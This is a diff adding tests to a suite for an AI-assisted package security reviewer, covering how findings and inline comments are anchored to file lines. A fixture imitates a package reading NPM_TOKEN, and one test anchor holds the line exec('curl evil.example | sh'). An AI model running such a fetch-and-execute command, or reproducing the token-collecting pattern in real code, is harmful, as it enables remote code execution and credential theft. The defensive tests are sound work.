@@ -12,6 +12,7 @@ import {
 import {
   buildReviewerSystemPrompt,
   MAX_AGENT_STEPS,
+  MAX_AI_COMMENTS,
   MAX_AI_FINDINGS,
   normalizeAiReviewEcosystem,
 } from "../server/lib/ai-review/contract";
@@ -685,6 +686,120 @@ describe("ai review orchestration", () => {
   });
 });
 
+describe("anchored findings and inline comments", () => {
+  const INDEX_JS = [
+    "const https = require('https');",
+    "",
+    "function collect() {",
+    "  return process.env.NPM_TOKEN;",
+    "}",
+    "",
+    "module.exports = { collect };",
+  ].join("\n");
+
+  const ANCHOR_OPTIONS = {
+    ...BASE_OPTIONS,
+    files: [
+      { path: "index.js", size: INDEX_JS.length, sha256: "abc", textSample: INDEX_JS, flags: [] },
+    ],
+    diff: [{ path: "index.js", status: "modified", flags: [] }],
+  };
+
+  async function reviewWith(submission) {
+    const { review } = await analyzeWithAi(
+      {},
+      "mock-reviewer",
+      ANCHOR_OPTIONS,
+      submittingModel({ ...VALID_REVIEW, ...submission }),
+    );
+    return review;
+  }
+
+  test("resolves a finding's anchor to a staged line and drops the anchor itself", async () => {
+    const ai = await reviewWith({
+      risk: "high",
+      releaseAssessment: "suspicious",
+      findings: [
+        {
+          ...aiFinding("high", "package/index.js"),
+          anchor: "  return process.env.NPM_TOKEN;",
+        },
+      ],
+      requiresManualReview: true,
+    });
+
+    // The path is normalized to the form the diff and file tree use, so the
+    // workbench can match the finding to the open file.
+    expect(ai.findings[0].file).toBe("index.js");
+    expect(ai.findings[0].line).toBe(4);
+    expect(ai.findings[0]).not.toHaveProperty("anchor");
+  });
+
+  test("keeps a finding whose anchor does not match, with no line", async () => {
+    const ai = await reviewWith({
+      risk: "high",
+      releaseAssessment: "suspicious",
+      findings: [
+        {
+          ...aiFinding("high", "index.js"),
+          anchor: "exec('curl evil.example | sh')",
+        },
+      ],
+      requiresManualReview: true,
+    });
+
+    expect(ai.findings).toHaveLength(1);
+    expect(ai.findings[0].line).toBeNull();
+  });
+
+  test("pins comments to their line and leaves risk untouched", async () => {
+    const ai = await reviewWith({
+      comments: [
+        { file: "index.js", anchor: "const https = require('https');", note: "Unchanged import." },
+      ],
+    });
+
+    expect(ai.comments).toEqual([{ file: "index.js", note: "Unchanged import.", line: 1 }]);
+    // A note is not a signal: it cannot move the release verdict.
+    expect(computeScanRisk([], ai)).toBe("low");
+  });
+
+  test("keeps a real-file comment whose anchor is unusable, unpinned", async () => {
+    const ai = await reviewWith({
+      comments: [{ file: "index.js", anchor: "}", note: "Closes the collector." }],
+    });
+
+    expect(ai.comments).toEqual([{ file: "index.js", note: "Closes the collector.", line: null }]);
+  });
+
+  test("drops a comment on a file this review never saw", async () => {
+    const ai = await reviewWith({
+      comments: [
+        { file: "vendor/ghost.js", anchor: "const https = require('https');", note: "Invented." },
+      ],
+    });
+
+    expect(ai.comments).toEqual([]);
+  });
+
+  test("caps comments at MAX_AI_COMMENTS", async () => {
+    const ai = await reviewWith({
+      comments: Array.from({ length: MAX_AI_COMMENTS + 2 }, (_, index) => ({
+        file: "index.js",
+        anchor: "const https = require('https');",
+        note: `note ${index}`,
+      })),
+    });
+
+    expect(ai.comments).toHaveLength(MAX_AI_COMMENTS);
+  });
+
+  test("a submission without comments completes with an empty list", async () => {
+    const ai = await reviewWith({});
+    expect(ai.comments).toEqual([]);
+  });
+});
+
 describe("displayedAiResult", () => {
   test("returns null when no review is provided", () => {
     expect(displayedAiResult(null)).toBeNull();
@@ -762,6 +877,9 @@ describe("displayedAiResult", () => {
           recommendation: "review manually",
         },
       ],
+      // The input above omits `comments`, as every record written before
+      // inline comments existed does; the accessor fills the empty list.
+      comments: [],
       requiresManualReview: true,
     });
   });
